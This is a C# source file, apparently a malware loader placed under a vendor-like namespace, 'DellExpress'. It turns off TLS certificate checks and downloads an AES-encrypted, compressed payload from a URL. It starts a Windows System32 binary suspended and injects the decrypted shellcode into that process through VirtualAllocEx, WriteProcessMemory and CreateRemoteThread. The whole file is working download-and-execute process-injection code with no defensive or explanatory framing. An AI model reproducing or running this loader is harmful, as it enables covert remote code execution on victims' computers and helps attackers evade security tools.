using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.IO.Compression;

namespace DellExpress
{
    public class Program
    {
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;

        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public int Length = Marshal.SizeOf(typeof(SecurityAttributes));
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public int cb = Marshal.SizeOf(typeof(StartupInfo));
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public int dwX = 0;
            public int dwY = 0;
            public int dwXSize = 0;
            public int dwYSize = 0;
            public int dwXCountChars = 0;
            public int dwYCountChars = 0;
            public int dwFillAttribute = 0;
            public int dwFlags = 0;
            public short wShowWindow = 0;
            public short cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
        }

        [Flags]
        public enum CreateProcessFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(
            string lpApplicationName,
            string lpCommandLine,
            SecurityAttributes lpProcessAttributes,
            SecurityAttributes lpThreadAttributes,
            bool bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] buffer,
            IntPtr dwSize,
            int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        public static async Task DownloadAndExecuteAsync(string url, string targetBinary, string compressionAlgorithm, byte[] aesKey, byte[] aesIV)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromMilliseconds(50000000);
                var encrypted = await client.GetByteArrayAsync(url);
                var actual = aesKey != null && aesIV != null ? Decrypt(encrypted, 16, encrypted.Length - 16, aesKey, aesIV) : encrypted;
                var shellcode = Decompress(actual, compressionAlgorithm);

                var binaryPath = $"C:\\Windows\\System32\\{targetBinary}";
                CreateSuspendedProcess(binaryPath, shellcode);
            }
        }

        private static void CreateSuspendedProcess(string binaryPath, byte[] shellcode)
        {
            var startupInfo = new StartupInfo();
            CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, startupInfo, out var processInfo);
            var allocatedMemory = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(processInfo.hProcess, allocatedMemory, shellcode, new IntPtr(shellcode.Length), 0);
            CreateRemoteThread(processInfo.hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
        }

        private static byte[] Decompress(byte[] data, string compressionAlgorithm)
        {
            using (var input = new MemoryStream(data))
            using (var output = new MemoryStream())
            {
                Stream decompressionStream;
                if (compressionAlgorithm == "gzip")
                {
                    decompressionStream = new GZipStream(input, CompressionMode.Decompress);
                }
                else if (compressionAlgorithm == "deflate9")
                {
                    decompressionStream = new DeflateStream(input, CompressionMode.Decompress);
                }
                else
                {
                    throw new ArgumentException("Unsupported compression algorithm: " + compressionAlgorithm);
                }

                decompressionStream.CopyTo(output);
                return output.ToArray();
            }
        }

        private static byte[] Decrypt(byte[] ciphertext, int offset, int count, byte[] aesKey, byte[] aesIV)
        {
            using (var aesAlg = Aes.Create())
            {
                aesAlg.Key = aesKey;
                aesAlg.IV = aesIV;
                aesAlg.Padding = PaddingMode.None;

                using (var decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))
                using (var msDecrypt = new MemoryStream(ciphertext, offset, count))
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    var decrypted = new byte[count];
                    var byteCount = csDecrypt.Read(decrypted, 0, decrypted.Length);
                    Array.Resize(ref decrypted, byteCount);
                    return decrypted;
                }
            }
        }
    }
}
